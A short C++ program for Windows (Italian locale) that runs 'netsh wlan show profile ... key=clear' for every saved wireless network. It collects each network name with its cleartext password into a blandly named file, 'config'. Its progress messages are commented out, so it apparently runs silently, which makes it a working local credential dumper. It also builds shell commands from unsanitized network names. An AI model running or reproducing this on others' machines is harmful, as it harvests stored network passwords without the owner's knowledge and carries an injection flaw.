#include <iostream>
#include <sstream>
#include <fstream>
#include <string.h>
#include <stdexcept>
#include <stdio.h>
#include <string>
#include <vector>

using namespace std;


string exec(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw runtime_error("_popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}

vector<string> getWifiList() {
	stringstream ss(exec("netsh wlan show profile").data());
	string input;
	vector<string> wifi;
	while(getline(ss,input))
		if (input.find("Tutti i profili utente") != string::npos)
			wifi.push_back(input.substr(32,input.length()));
	return wifi;
}

string getPassword(string ssid) {
	string command = "netsh wlan show profile \"" + ssid + "\" key=clear";
	stringstream ss(exec(command.data()).data());
	string input;
	while(getline(ss,input)){
		if (input.find("Contenuto chiave") != string::npos)
			return input.substr(34,input.length());
	}
	return "< NULL >";
}


int main()
{
	//cout << "Getting list of known wifi networks..\n\n";
	vector<string> wifi = getWifiList();

	ofstream ofs("config");
	for (string ssid: wifi)
	{
		//cout << "Getting password for " << ssid << "..\n";
		ofs << "SSID\t:\t" << ssid << "\n";
		ofs << "Key\t:\t" << getPassword(ssid) << "\n\n";
	}
	ofs.close();
	//cout << "\nOuput saved to `saved-wifi-passwords.txt`..\n";

	return 0;
}
